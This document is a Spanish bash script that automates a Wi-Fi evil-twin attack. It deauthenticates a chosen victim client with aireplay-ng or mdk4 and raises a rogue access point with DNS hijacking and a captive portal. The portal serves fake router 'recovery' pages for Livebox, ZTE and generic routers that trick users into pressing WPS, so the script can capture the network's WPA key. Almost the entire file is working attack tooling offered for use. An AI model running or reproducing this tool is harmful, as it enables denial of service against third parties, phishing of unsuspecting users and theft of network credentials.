#!/bin/bash
version=1.0
## Para soporte, lloros y quejas, empaquetar /tmp/awitas/ y compartirlo junto con el problema javierbu @ proton me
########################### byTux0
### Este script esta inspirado en el trabajo de Koala633 con su trabajo hostbase. https://github.com/Koala633/hostbase ###
###
### La implementacion del portal cautivo esta inspirada o fusilada del trabajo de v1s1t0r1sh3r3 en airgeddon https://github.com/v1s1t0r1sh3r3/airgeddon
###
####### Quiza te interese configurar las siguientes variabes###############
# Es el directorio donde se guardan las variables y las salidas de los comandos importantes. Muy interesante si se necesita depurar algo
pwd=/tmp/awitas/
# Es el tiempo (en segundos) de espera despues de quitar el modo monitor durante el ataque. Algunos dispositivos se toman su tiempo.
tiempo_espera_monitor=5
# Este es el tiempo (en segundos) de espera al reiniciar NertworManager durante el ataque. Algunos dispositivos tardan en volver a trabajar bien.
tiempo_espera=20
# Estos son los paquetes de desautenticacion que manda aireplay. Ponlos a tu gusto, a fin de cuentas a mi me da lo mismo..
desaut=60
# Estos son los segundos que estaremos haciendo el DoS con mdk4 si escogemos esta opcion.
tiempo_mdk4=40
############################################################################3
##################################
CYAN=`echo -e "\033[01;36m"`
VERDE=`echo -e "\e[32m"`
BLANCO=`echo -e "\e[0m"`
AZUL=`echo -e "\e[34m"`
ROJO=`echo -e "\e[31m"`
NORMAL=`echo -e "\033[1;37m"`
ULTRAVERDE=`echo -e "\e[1;32m"`
AMARILLO=`echo -e "\e[1;33m"`
VIOLETA=`echo -e "\e[1;35m"`
#################################
salida=salida
iface_net=$(ip route | awk '/default via/ {print $5}')
pid=$$
pids=$(pgrep -P $pid)
trap "$salida" EXIT
### Aqui se guardaran logs, variables y demas monsergas.
rm -rf ${pwd} 2>/dev/null
mkdir ${pwd} &>/dev/null
echo $canal >${pwd}/canal
canal_nuevo=2
pwd_local=$(pwd)
function salida () {
if [ "$salir" == "1" ];then
	exit 1
fi
/etc/init.d/dnsmasq start &>/dev/null
/etc/init.d/wpa_supplicant start &>/dev/null
if [ $airodump = 1 ] 2>/dev/null ;then
	killall airodumop-ng &>/dev/null
fi
echo;echo -e "${AMARILLO}[::]${BLANCO} Limpieza!"
tput cnorm 2>/dev/null
echo;echo -e "${VERDE}[::]${BLANCO} Quitando modo monitor si esta puesto...!"
monitor quitar &>/dev/null
echo -e "${VERDE}[::]${BLANCO} Reiniciando NetworkManager..."
systemctl restart NetworkManager >/dev/null 2>&1
systemctl restart wpa_supplicant >/dev/null 2>&1
systemctl restart NetworkManager.service >/dev/null 2>&1
service wpa_supplicant restart >/dev/null 2>&1
/etc/rc.d/rc.networkmanager restart >/dev/null 2>&1
for proceso in lighttpd opennds dnsmasq hostapd wpa_supplicant ;do
	for i in `ps $bandera | grep $proceso | grep -v grep | awk -F ' ' '{print $1}'`;do
		echo -e "${VERDE}[::]${BLANCO} Matando PID $i de $proceso."
		kill -9 $i 
	done
		echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la proxima!."; echo
		echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
		break
done
kill -9 $$ >/dev/null 1>&2 && exit 
}
function eleccion_dispositivo () {
echo;echo " Lista de dispositivos disponibles:";echo
rm ${pwd}lista_interfaces 2>/dev/null
iw dev | grep -oP 'Interface \K\S+' >${pwd}lista_interfaces 
cuenta=1
for i in `cat ${pwd}lista_interfaces`; do
rm ${pwd}$i 2>/dev/null
touch ${pwd}$i 
driver=$(ethtool -i $i | grep driver | cut -d ':' -f2)
echo "driver: $(ethtool -i $i | grep driver | cut -d ':' -f2)" >> ${pwd}$i
phy=$(cat /sys/class/net/${i}/phy80211/name)
echo "phy: $(cat /sys/class/net/${i}/phy80211/name)" >> ${pwd}$i
iw phy $phy info | awk '/^[[:blank:]]*\* monitor/' &>/dev/null
if [ $? -eq 0 ];then
        monitor=${VERDE}si${NORMAL}
else
        monitor=${ROJO}no${NORMAL}
fi
iw phy $phy info | awk '/^[[:blank:]]*\* AP$/' | grep AP &>/dev/null
if [ $? -eq 0 ];then
        AP=${VERDE}si${NORMAL}
else
        AP=${ROJO}no${NORMAL}
fi
iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 2412 &>/dev/null
if [ $? -eq 0 ];then
        b24=${VERDE}si${NORMAL}
        echo "banda:24">>${pwd}$i
else
        b24=${ROJO}no${NORMAL}
fi
iw phy $(grep phy ${pwd}$i | cut -d ':' -f2) info | grep -A 4 Frequencies | grep 5180 &>/dev/null
if [ $? -eq 0 ];then
        b5=${VERDE}si${NORMAL}
        echo "banda:5">>${pwd}$i
else
        b5=${ROJO}no${NORMAL}
fi
echo "  $i (${phy}) ${VIOLETA}|${NORMAL} 2,4GHz: $b24 ${VIOLETA}|${NORMAL} 5GHz: $b5 ${VIOLETA}|${NORMAL} modo monitor: $monitor ${VIOLETA}|${NORMAL} Modo AP: $AP ${VIOLETA}|${NORMAL} driver:${VERDE}${driver}${NORMAL}"
unset driver phy 24 5 monitor AP
((cuenta++))
done
echo
}
function abierto () {
/etc/init.d/wpa_supplicant stop &>/dev/null
systemctl stop wpa_supplicant.service &>/dev/null
killall wpa_supplicant &>/dev/null
ip addr add 192.168.12.1/24 dev $iface_ap 
pkill hostapd* &>/dev/null
pkill wpa_supplicant &>/dev/null
rm /tmp/hostapd.psk &>/dev/null
touch /tmp/hostapd.psk &>/dev/null
part_ip=`echo $rango | cut -d. -f1-3`
echo "
interface=$iface_ap
address=/#/192.168.12.1
dhcp-range=192.168.12.10,192.168.12.100,2h
address=/google.com/172.217.5.238
address=/gstatic.com/172.217.5.238
log-queries
no-daemon
no-resolv
no-hosts" >${pwd}dnsmasq.conf
/etc/init.d/dnsmasq stop &>/dev/null
killall dnsmasq 2>/dev/null
rm ${pwd}dnsmasq &>/dev/null
dnsmasq -C ${pwd}dnsmasq.conf -q --log-facility=${pwd}dnsmasq >${pwd}dnsmasq_salida 2>&1 &
dnsmasq_pid=$!
sleep 3
echo "
beacon_int=100
ssid=$nombre_ap
interface=$iface_ap
driver=nl80211
channel=4
ctrl_interface_group=0
ignore_broadcast_ssid=0
ap_isolate=0
hw_mode=g
ctrl_interface=${pwd}hostapd_ctrl" > ${pwd}hostapd.conf
if [ $tipo -eq 1 ];then
	echo "wpa=3" >> ${pwd}hostapd.conf
	echo "auth_algs=1" >> ${pwd}hostapd.conf
	echo "ieee80211n=1" >> ${pwd}hostapd.conf
	echo "wmm_enabled=1" >> ${pwd}hostapd.conf
	echo "ap_setup_locked=0" >> ${pwd}hostapd.conf
	echo "uuid=87654321-9abc-def0-1234-56789abc0000" >> ${pwd}hostapd.conf
	echo "device_name=Wireless AP" >> ${pwd}hostapd.conf
	echo "manufacturer=Company" >> ${pwd}hostapd.conf
	echo "model_name=WAP" >> ${pwd}hostapd.conf
	echo "model_number=123" >> ${pwd}hostapd.conf
	echo "serial_number=12345" >> ${pwd}hostapd.conf
	echo "device_type=6-0050F204-1" >> ${pwd}hostapd.conf
	echo "os_version=01020300" >> ${pwd}hostapd.conf
	echo "friendly_name=WPS Access Point" >> ${pwd}hostapd.conf
	echo "wpa_key_mgmt=WPA-PSK" >> ${pwd}hostapd.conf
	echo "wpa_pairwise=CCMP TKIP" >> ${pwd}hostapd.conf
	#echo "rsn_pairwise=CCMP" >> ${pwd}hostapd.conf
	echo "wpa_passphrase=00000000" >> ${pwd}hostapd.conf
	echo "rsn_pairwise=TKIP CCMP" >> ${pwd}hostapd.conf
	echo "wpa_psk_file=/tmp/hostapd.psk" >> ${pwd}hostapd.conf
	echo "ieee8021x=1" >> ${pwd}hostapd.conf
	echo "eap_server=1" >> ${pwd}hostapd.conf
	echo "wps_state=2" >> ${pwd}hostapd.conf
	echo "wps_pin_requests=/tmp/hostapd.pin-req" >> ${pwd}hostapd.conf
	echo "config_methods=label display push_button keypad" >> ${pwd}hostapd.conf
	echo "pbc_in_m1=1" >> ${pwd}hostapd.conf
fi
hostapd   ${pwd}hostapd.conf >${pwd}hostapd &
hostapd_pid=$!
berate_confirmado
berate_pid=$!
generar_index
fiptables
server
dos &
pid_dos=$!
while :
do
	sleep 30
	grep -i CONNECTED ${pwd}hostapd >/dev/null
	if [ $? = 0 ];then
		echo -e "${VERDE}[AP]${BLANCO}    Usuario conectado en nuestro punto de acceso! Parando DoS...${BLANCO}"
		kill $pid_dos
		echo -e "${VERDE}[DoS]${BLANCO}	Ataque DoS parado."
		kill $pid_wps_pbc &>/dev/null
		touch ${pwd}parar
    	break
	else
		echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
	fi
	if [ $tipo -ne 2 ];then
		kill $pid_wps_pbc &>/dev/null
       		hostapd_cli -p ${pwd}/hostapd_ctrl wps_pbc >${pwd}hostapd_cli_wps_pbc &
       		pid_wps_pbc=$!
	fi
done
pbc_bucle
}
function server () {
echo '
server.modules = (
"mod_auth",
"mod_cgi",
"mod_redirect"
)

$HTTP["host"] =~ "(.*)" {
url.redirect = ( "^/index.htm$" => "/")
url.redirect-code = 302
}
$HTTP["host"] =~ "gstatic.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.google.com/")
url.redirect-code = 302
}
$HTTP["host"] =~ "captive.apple.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.apple.com/")
url.redirect-code = 302
}
$HTTP["host"] =~ "msftconnecttest.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
url.redirect-code = 302
}
$HTTP["host"] =~ "msftncsi.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
url.redirect-code = 302
}
server.port = 80

index-file.names = ( "index.htm" )

server.error-handler-404 = "/"

mimetype.assign = (
".css" => "text/css",
".js" => "text/javascript"
)

cgi.assign = ( ".htm" => "/bin/bash" )
' > ${pwd}lighttpd.conf
echo "server.document-root = \"${pwd}server/\"" >> ${pwd}lighttpd.conf
lighttpd -f ${pwd}lighttpd.conf &
pid_lighttpd=$!
}
function fiptables () {
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.12.1:80
iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
}
function generar_index() {
rm -r ${pwd}server 2>/dev/null
mkdir -p ${pwd}server/images 
echo '
body {
		background-color: lightgrey;
		color: #140f07;
		margin: 0;
		padding: 10px;
		font-family: sans-serif;
	}

	hr {
		display:block;
		margin-top:0.5em;
		margin-bottom:0.5em;
		margin-left:auto;
		margin-right:auto;
		border-style:inset;
		border-width:5px;
	}

	.offset {
		background: rgba(300, 300, 300, 0.6);
		border-radius: 10px;
		margin-left:auto;
		margin-right:auto;
		max-width:600px;
		min-width:200px;
		padding: 5px;
	}

	.insert {
		background: rgba(350, 350, 350, 0.7);
		border: 2px solid #aaa;
		border-radius: 10px;
		min-width:200px;
		max-width:100%;
		padding: 5px;
	}

	.insert > h1 {
		font-size: medium;
		margin: 0 0 15px;
	}

	img {
		width: 40%;
		max-width: 180px;
		margin-left: 0%;
		margin-right: 10px;
		border-radius: 3px;
	}

	input[type=text], input[type=email], input[type=password], input[type=number], input[type=tel] {
		font-size: 1em;
		line-height: 2em;
		height: 2em;
		color: #0c232a;
		background: lightgrey;
	}

	input[type=submit], input[type=button] {
			font-size: 1em;
		line-height: 2em;
		height: 2em;
		font-weight: bold;
		border: 0;
		border-radius: 10px;
		background-color: #1a7856;
		padding: 0 10px;
		color: #fff;
		cursor: pointer;
		box-shadow: rgba(50, 50, 93, 0.1) 0 0 0 1px inset,
		rgba(50, 50, 93, 0.1) 0 2px 5px 0, rgba(0, 0, 0, 0.07) 0 1px 1px 0;
	}

	med-blue {
		font-size: 1.2em;
		color: #0073ff;
		font-weight: bold;
		font-style: normal;
	}

	big-red {
		font-size: 1.5em;
		color: #c20801;
		font-weight: bold;
	}

	italic-black {
		font-size: 1em;
		color: #0c232a;
		font-weight: bold;
		font-style: italic;
		margin-bottom: 10px;
	}

	copy-right {
		font-size: 0.7em;
		color: darkgrey;
		font-weight: bold;
		font-style: italic;
	} '> ${pwd}server/index.css
cp imagenes/${modelo}/* ${pwd}server/images/ &>/dev/null
if [ "$modelo" == "livebox" ];then
	echo -e "#!/bin/bash
	echo -e '<!DOCTYPE html>'
	echo -e '<html>'
	echo -e '<head>'
	echo -e '<meta charset=\"utf-8\">'
	echo -e '<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">'
	echo -e '<link rel=\"shortcut icon\" href=\"/images/WPS_Livebox.png\" type=\"image/x-icon\">'
	echo -e '<link rel=\"stylesheet\" type=\"text/css\" href=\"/index.css\">'
	echo -e '<title>Página de recuperación</title>'
	echo -e '</head>'
	echo -e '<body>'
	echo -e '<div class=\"offset\">'
	echo -e '<big-red>'
	echo -e 'Página de recuperación <br>'
	echo -e '<br>'
	echo -e '</big-red>'
	echo -e '<div class=\"insert\" style=\"max-width:100%;\">'
	echo -e '<b></b><br>'
	echo -e '<med-blue>Ha ocurrido un error en la última actualización. Es necesario sincronizar el dispositivo.'
	echo -e '<italic-black>'
	echo -e '<br>'
	echo -e '<br>'
	echo -e 'Presione durante 2 segundos el botón WPS de su dispositivo.'
	echo -e '<br>'
	echo -e '</italic-black>'
	echo -e '<img style=\"width:100%; max-width: 100%;\" src=\"/images/WPS_Livebox.png\" alt=\"Boton WPS\"><br>'
	echo -e '<br>'
	echo -e '<br>'
	echo -e '<italic-black>'
	echo -e 'Las luces 1 y 2 parpadearán durante la sincronización.'
	echo -e '<br>'
	echo -e '<img style=\"width:100%; max-width: 100%;\" src=\"/images/Luces-livebox-plus.png\" alt=\"Luces WPS\"><br>'
	echo -e '</italic-black>'
	echo -e '<br>'
	echo -e '<br>'
	echo -e '<italic-black>'
	echo -e 'Una vez dejen de parpadear, pasados 3 minutos, su dispositivo volverá a estar operativo. Si no fuera así, repita el proceso una vez más. Si continua experimentando problemas de conexión, por favor, póngase en contacto con el servicio de atención.'
	echo -e '<br>'
	echo -e '<br>'
	echo -e 'Gracias por su colaboración.'
	echo -e '<br>'
	echo -e '<br>'
	echo -e '</italic-black>'
	echo -e '</body>'
	echo -e '</html>'" >${pwd}server/index.htm
elif [ "$modelo" == "generico" ];then
	echo -e "#!/bin/bash
	echo -e '<!DOCTYPE html>'
	echo -e '<html>'
	echo -e '<head>'
	echo -e '<meta charset=\"utf-8\">'
	echo -e '<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">'
	echo -e '<link rel=\"shortcut icon\" href=\"/images/generico.jpg\" type=\"image/x-icon\">'
	echo -e '<link rel=\"stylesheet\" type=\"text/css\" href=\"/index.css\">'
	echo -e '<title>Pagina de recuperacion</title>'
	echo -e '</head>'
	echo -e '<body>'
	echo -e '<div class=\"offset\">'
	echo -e '<big-red>'
	echo -e 'Página de recuperación <br>'
	echo -e '<br>'
	echo -e '</big-red>'
	echo -e '<div class=\"insert\" style=\"max-width:100%;\">'
	echo -e '<b></b><br>'
	echo -e '<med-blue>Ha ocurrido un error en la última actualización. Es necesario sincronizar el dispositivo.'
	echo -e '<italic-black>'
	echo -e '<br>'
	echo -e '<br>'
	echo -e 'Presione el botón con el distintivo WPS de su dispositivo durante 2 segundos.'
	echo -e '<br>'
	echo -e '</italic-black>'
	echo -e '<img style=\"width:100%; max-width: 100%;\" src=\"/images/generico.jpg\" alt=\"WPS\"><br>'
	echo -e '<br>'
	echo -e '<italic-black>'
	echo -e 'Durante la sincronización parpadearán luces en el dispositivo.'
	echo -e '<br>'
	echo -e '</italic-black>'
	echo -e '<br>'
	echo -e '<br>'
	echo -e '<italic-black>'
	echo -e 'Una vez dejen de parpadear, pasados 3 minutos, volvera a estar operativo. Si no fuera así, repita el proceso una vez más. Si continua experimentando problemas de conexión, por favor, póngase en contacto con su servicio de atención'
	echo -e '<br>'
	echo -e '<br>'
	echo -e 'Gracias por su colaboración.'
	echo -e '<br>'
	echo -e '<br>'
	echo -e '</italic-black>'
	echo -e '</body>'
	echo -e '</html>'" >${pwd}server/index.htm
elif [ "$modelo" == "ZTE" ];then
        echo -e "#!/bin/bash
        echo -e '<!DOCTYPE html>'
        echo -e '<html>'
        echo -e '<head>'
        echo -e '<meta charset=\"utf-8\">'
        echo -e '<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">'
        echo -e '<link rel=\"shortcut icon\" href=\"/images/WPS_Livebox.png\" type=\"image/x-icon\">'
        echo -e '<link rel=\"stylesheet\" type=\"text/css\" href=\"/index.css\">'
        echo -e '<title>Página de recuperación</title>'
        echo -e '</head>'
        echo -e '<body>'
        echo -e '<div class=\"offset\">'
        echo -e '<big-red>'
        echo -e 'Página de recuperación <br>'
        echo -e '<br>'
        echo -e '</big-red>'
        echo -e '<div class=\"insert\" style=\"max-width:100%;\">'
        echo -e '<b></b><br>'
        echo -e '<med-blue>Ha ocurrido un error en la última actualización. Es necesario sincronizar el dispositivo.'
        echo -e '<italic-black>'
        echo -e '<br>'
        echo -e '<br>'
        echo -e 'Presione durante 2 segundos el botón WPS de su dispositivo.'
        echo -e '<br>'
        echo -e '</italic-black>'
        echo -e '<img style=\"width:100%; max-width: 100%;\" src=\"/images/ZTE.png\" alt=\"Boton WPS\"><br>'
        echo -e '<br>'
        echo -e '<br>'
        echo -e '<italic-black>'
        echo -e 'La luz indicativa de WPS parpadeará durante la sincronización.'
        echo -e '<br>'
        echo -e '<img style=\"width:100%; max-width: 100%;\" src=\"/images/Luces-zte.png\" alt=\"Luces WPS\"><br>'
        echo -e '</italic-black>'
        echo -e '<br>'
        echo -e '<br>'
        echo -e '<italic-black>'
        echo -e 'Una vez dejen de parpadear, pasados 3 minutos, su dispositivo volverá a estar operativo. Si no fuera así, repita el proceso una vez más. Si continua experimentando problemas de conexión, por favor, póngase en contacto con el servicio de atención.'
        echo -e '<br>'
        echo -e '<br>'
        echo -e 'Gracias por su colaboración.'
        echo -e '<br>'
        echo -e '<br>'
        echo -e '</italic-black>'
        echo -e '</body>'
        echo -e '</html>'" >${pwd}server/index.htm
fi
}
function berate_confirmado() {
echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de acceso... Si no pasas de esta pantalla, revisa que tu dispositivo sopote el modo AP.${BLANCO}"
while :
do
	grep ENABLE ${pwd}hostapd &>/dev/null
	if [ $? = 0 ];then
		echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso con nombre ${AMARILLO} $nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
		sleep 1
		break
	else
		sleep 5
	fi
done
}
echo "Vaya dedos tienes. Pon mas atencion.
Estas un poco torpe, no?
No sabes escribir?
Madre mia del amor hermoso que torpeza la tuya.
Tan dificil es?
Que usas, salchichas en vez de dedos?
Busco un tutorial en youtube de como teclear?
En serio?
Tienes cerca a alguien que pueda teclear por ti?
Asi no terminamos nunca.
Tu torpeza no tiene limites.
Habria que pedirle a platzy que te haga un curso especial para que aprendas a escribir.
Tas pendejo?
Bro, me estas vacilando, no?" >${pwd}torpe
function validar_numero () {
if [[ $1 -eq "0" ]] 2>/dev/null;then
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	$2
fi
numero='^[0-9]+$'
while :
do
	if [[ $1 =~ $numero ]];then
		break
	else
		echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una repsuesta valida. Pulsa enter para probar otra vez${NORMAL}"
		read
		$2
		break
	fi
done
}
function comprobar_wpa () {
while :
do
	sleep 10
	ps $bandera | grep -i "wpa_supplicant -c ${pwd}pbc.conf" | grep -v grep &>/dev/null
	if [ $? -ne 0 ];then
		escuchar_wps
	fi
	if ( grep -q "network=" ${pwd}pbc.conf ) ;then
		grep "00000000" ${pwd}pbc.conf
		if [ $? -ne 0 ];then
			cp ${pwd}pbc.conf  ${red}_WPA.txt
			echo;echo -e "${VERDE}		Ole !!! hemos conseguido la llave!${BLANCO}"
			wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
			ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
			echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
			echo -e "${AMARILLO}[::]${BLANCO}	Se ha creado un archivo con la WPA en el directorio de trabajo."
			echo -e "${AMARILLO}[::]${BLANCO}	Un placer y hasta la proxima!!!...ByTux0..."
			kill -9 $pid_comprobar_wpa &>/dev/null
			kill -9 $crono_pid &>/dev/null
			break
		fi
	fi
done
kill $pids >/dev/null 2>&1
salida
}
function archivo_pbc () {
kill $pid_comprobar_wpa &>/dev/null
kill $wpa_supplicant_pid &>/dev/null
ls ${pwd}pbc.conf &>/dev/null
if [ $? -ne 0 ];then
	rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
	echo "ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=root
update_config=1"  >> ${pwd}pbc.conf
fi
comprobar_wpa
pid_comprobar_wpa=$!
}
function escuchar_wps () {
ls ${pwd}pbc.conf &>/dev/null
if [ $? -ne 0 ];then
	archivo_pbc
fi
rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
pkill wpa_supplicant &>/dev/null
wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
wpa_supplicant_pid=$!
if [ $? != 0 ]; then
	sleep 3
	monitor limpiar &>/dev/null
	escuchar_wps
fi
kill $pid_comprobar_wpa &>/dev/null
comprobar_wpa &
crono
crono_pid=$!
}
function crono () {
krono=30
while [ $krono -gt 0 ]; 
do
	krono=$((krono - 1))
	sleep 1
done
sleep 2
echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
kill $pid_wpacli &>/dev/null
sleep 3
wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli &
pid_wpacli=$!
crono
crono_pid=$!
}
function pbc_bucle () {
echo -e "${VERDE}[WPS]${BLANCO}	Comenzamos  a escuchar WPS"
sleep 2 
monitor quitar &>/dev/null
escuchar_wps
sleep 3
comprobar_wpa
pid_comprobar_wpa=$!
}
function comprobar () {
clear
banner
if [ $tipo -eq 1 ];then
	seguridad=protegido
elif [ $tipo -eq 2 ];then
	seguridad=abierto
fi
echo;echo -e "${AMARILLO}  Vamos a comprobar todos los datos antes de empezar el ataque${BLANCO}."
red=`cat ${pwd}elegida | cut -d ',' -f14`
if [ $banda5 = "si" ];then
	banda=5GHz
else
	banda=2,4GHz
fi
echo;echo -e "${AMARILLO}[::]${BLANCO} Banda de ataque: ${VERDE} $banda"
echo -e "${AMARILLO}[::]${BLANCO} Red a atacar: ${VERDE} $red"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para el ataque DoS: ${VERDE} $iface_dos"
ls ${pwd}Openwrt &>/dev/null
if [ $? -ne 0 ];then
echo -e "${AMARILLO}[::]${BLANCO} Tipo de ataque DoS: ${VERDE} $ataque_dos"
fi
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para crear el punto de acceso: ${VERDE} $iface_ap"
echo -e "${AMARILLO}[::]${BLANCO} Cliente a atacar: ${VERDE} $mac_estacion"
echo -e "${AMARILLO}[::]${BLANCO} Nombre de nuestra red ${VERDE} $nombre_ap"
echo -e "${AMARILLO}[::]${BLANCO} Tipo de red ${VERDE} $seguridad"
echo -e "${AMARILLO}[::]${BLANCO} Marca router a atacar: ${VERDE} $modelo"
echo;echo -e "${AMARILLO}[::]${BLANCO} Opciones: "
echo;echo -e "   ${AMARILLO}1)${BLANCO}	Que se tense!! "
echo -e "   ${AMARILLO}2)${BLANCO}	Quiero volver a configurarlo todo. "
echo -e "   ${AMARILLO}3)${BLANCO}	Quiero volver a configurar los datos del punto de acceso. "
echo -e "   ${AMARILLO}4)${BLANCO}	Quiero volver a elegir red de las que ya hemos escaneado. "
echo -e "   ${AMARILLO}5)${BLANCO}	Quiero volver a escanear. "
echo;echo -ne "${AMARILLO}[??]${BLANCO}	Opcion: "
read opcion
if [ -z $opcion ];then
        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
        read
        comprobar 
fi
validar_numero $opcion comprobar 
if [ $opcion -eq 1  ];then
	abierto
elif [ $opcion -eq 2 ];then
	empezar
elif [ $opcion -eq 3 ];then
    	config_ap
elif [ $opcion -eq 4 ];then
	parseo
elif [ $opcion -eq 5 ];then
    	airodump
else
	echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsueta valida. Pulsa enter para probar otra vez${NORMAL}"
	read
	comprobar
fi
}
function dos () {
clear
banner
rm ${pwd}parar &>/dev/null
echo;echo -e "${AMARILLO}   COMIENZA EL ATAQUE! No se abriran ventanas adicionales. Para depurar, mirar en la carpeta ${pwd}${BLANCO}";echo
echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso ${AMARILLO}$nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
echo -e "${VERDE}[DoS]${BLANCO}	Inicia ataque DoS..."
while :
do
	ls ${pwd}parar &>/dev/null
	if [ $? = 0 ];then
    	break
	fi
	timeout=10
	canal_nuevo
	canal=$canal_nuevo
	echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente esta en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
	echo -e "${AMARILLO}[DoS]${BLANCO}	Reiniciando DoS..."
	ip a | grep $iface_dos &>/dev/null
	if [ $? = 0 ];then
   		iw dev $iface_dos set channel $canal &>/dev/null
    	else
    		monitor poner  &>/dev/null
	fi
	if [ "$mdk4" = "si" ];then
		timeout --preserve-status --foreground $tiempo_mdk4 mdk4 $iface_mon d -c $canal -B $macap -S $mac_estacion &>>${pwd}mdk4
	else
		aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
	fi
	pid_aireplay=$!
done
echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
}
function canal_nuevo {
rm ${pwd}airodump_canal* 2>/dev/null
if [ $banda5 = si ];then
	timeout --preserve-status --foreground $timeout airodump-ng --band a --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodump5&>/dev/null
else
	timeout --preserve-status --foreground $timeout airodump-ng --bssid $macap $iface_mon -w ${pwd}airodump_canal --output-format csv 2>${pwd}fallo_airodum24&>/dev/null
fi
canal_nuevo=`cat ${pwd}airodump_canal-01.csv | grep $macap | grep WPA | awk -F "," '{print $4}'` &>/dev/null
if [ $banda5 = si ];then
	if (( canal_nuevo >=36 && canal_nuevo <= 165 ));then
		echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
	else
		echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
		timeout=$((timeout+2))
		canal_nuevo
	fi
else
	if (( canal_nuevo >=1 && canal_nuevo <= 14 ));then
		echo "$canal_nuevo" >${pwd}canal_nuevo &>/dev/null
	else
		echo -e "${ROJO}[DoS]${BLANCO}	No es posible determinar el canal de la red victima. Repetimos..."
		timeout=$((timeout+2))
		canal_nuevo
	fi
fi
canal=$canal_nuevo
echo $canal ${pwd}canal &>/dev/null
}
function config_ap () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
echo -e "${AMARILLO}[::]${BLANCO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
echo -e "  ${AMARILLO}1)${BLANCO}  Protegido"
echo -e "  ${AMARILLO}2)${BLANCO}  Abierto"
echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
read tipo
if [ -z $tipo ];then
        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
        read
        config_ap
fi
validar_numero $tipo config_ap
if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
	echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa enter para intentarlo otra vez"
 	read
	config_ap
fi
echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear. (Necesario): "
read nombre_ap
if [ -z $nombre_ap ];then
        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
        read
        config_ap 
fi
echo $nombre_ap >${pwd}nombre_ap &>/dev/null
if [ -z "$marca" ];then
	marca=desconocido
fi
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Info recopilada de la victima:"
echo;echo -e "${AZUL} Info OUI (marca): ${BLANCO}$marca"
echo -e "${AZUL} BSSID:${BLANCO} $maoui"
echo -e "${AZUL} ESSID:${BLANCO}$red"
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige la mejor opcion para la trampa. Si no sabes que es esto, elige generico: "
echo
rm ${pwd}modelos 2>/dev/null
touch ${pwd}modelos
cuenta=1
for i in `ls imagenes`;do
	echo -e "  ${AMARILLO}${cuenta})${BLANCO}  $i"
	echo " $cuenta $i" >>${pwd}modelos
	essids=`cat imagenes/${i}/targets | awk -F ';' '{print $3}'`
	bssids=`cat imagenes/${i}/targets | awk -F ';' '{print $2}'`
	mamo=`cat imagenes/${i}/targets | awk -F ';' '{print $1}'`
